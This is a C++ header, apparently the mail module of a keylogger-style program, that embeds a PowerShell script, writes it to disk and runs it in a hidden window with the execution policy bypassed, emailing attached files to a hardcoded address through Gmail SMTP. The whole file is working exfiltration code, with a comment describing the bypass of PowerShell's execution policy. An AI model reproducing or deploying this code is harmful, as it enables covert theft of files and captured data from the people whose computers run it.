#ifndef _SENDEMAIL_H_
#define _SENDEMAIL_H_

#include <fstream>
#include <vector>
#include <windows.h>
#include "inputOutput.h"
#include "timer.h"
#include "helper.h"

#define SCRIPT_NAME "psScript.ps1"

namespace Mail
{
	#define X_EM_TO "email"
	#define X_EM_FROM "email"
	#define X_EM_PASS "password"

	const std::string &PowerShellScript =
		"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
		"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		std::string(X_EM_TO) +
		"\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		std::string(X_EM_PASS) +
		"\""
		" -From \"" +
		std::string(X_EM_FROM) +
		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

	#undef X_EM_FROM
	#undef X_EM_TO
	#undef X_EM_PASS

	Timer m_timer;

	std::string stringReplace(std::string str, const std::string &keyStr, 
		const std::string &newStr)
	{
		if (keyStr.empty()) { return str; }

		size_t strPosition = 0;

		while ((strPosition = str.find(keyStr, strPosition)) != std::string::npos)
		{
			str.replace(strPosition, keyStr.length(), newStr), 
				strPosition += newStr.length();
		}

		return str;
	}

	bool checkFileExists(const std::string &fileName)
	{
		std::ifstream file(fileName);

		return (bool)file;
	}

	bool createScript()
	{
		std::ofstream script(inputOutput::getOurPath(true) + 
			std::string(SCRIPT_NAME));

		if (!script) { return false; }

		script << PowerShellScript;

		if (!script) { return false; }

		script.close();
		return true;
	}

	int sendMail(const std::string &subject, const std::string &body, 
		const std::string &attachments)
	{
		bool ok;

		ok = inputOutput::makeDir(inputOutput::getOurPath(true));

		if (ok) { return -1; }

		std::string scr_path = inputOutput::getOurPath(true) + 
			std::string(SCRIPT_NAME);

		if (!checkFileExists(scr_path))
		{
			ok = createScript();
		}
			
		if (ok) { return -2; }

		// Bypass PowerShell need for Admin privileges 
		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + 
			"\" -Subj \"" + stringReplace(subject, "\"", "\\\"") + "\" -Body \"" + 
			stringReplace(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"";

		SHELLEXECUTEINFO ShExecInfo = { 0 };
		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		ShExecInfo.hwnd = NULL;
		ShExecInfo.lpVerb = "open";
		ShExecInfo.lpFile = "powershell";
		ShExecInfo.lpParameters = param.c_str();
		ShExecInfo.lpDirectory = NULL;
		ShExecInfo.nShow = SW_HIDE;
		ShExecInfo.hInstApp = NULL;

		ok = (bool)ShellExecuteEx(&ShExecInfo);

		if (!ok) { return -3; }

		WaitForSingleObject(ShExecInfo.hProcess, 7000);
		DWORD exitCode = 100;
		GetExitCodeProcess(ShExecInfo.hProcess, &exitCode);

		m_timer.setFunction([&]()
		{
			WaitForSingleObject(ShExecInfo.hProcess, 6000);
			GetExitCodeProcess(ShExecInfo.hProcess, &exitCode);

			if ((int)exitCode == STILL_ACTIVE)
			{
				TerminateProcess(ShExecInfo.hProcess, 100);
			}
				
			Helper::writeLogFile("<From SendMail> Return Code: " + 
				Helper::toString((int)exitCode) + " (Mail Sent!)");
		});

		m_timer.repeatCount(1L);
		m_timer.setInterval(10L);
		m_timer.start(true);

		return (int)exitCode;
	}

	int sendMail(const std::string &subject, const std::string &body, 
		const std::vector<std::string> &att)
	{
		std::string attachments = "";

		if (att.size() == 1U)
		{
			attachments = att.at(0);
		}
		else
		{
			for (const auto &v : att)
			{
				attachments += v + "::";
			}
				
			attachments = attachments.substr(0, attachments.length() - 2);
		}

		return sendMail(subject, body, attachments);
	}
};

#endif _SENDEMAIL_H_
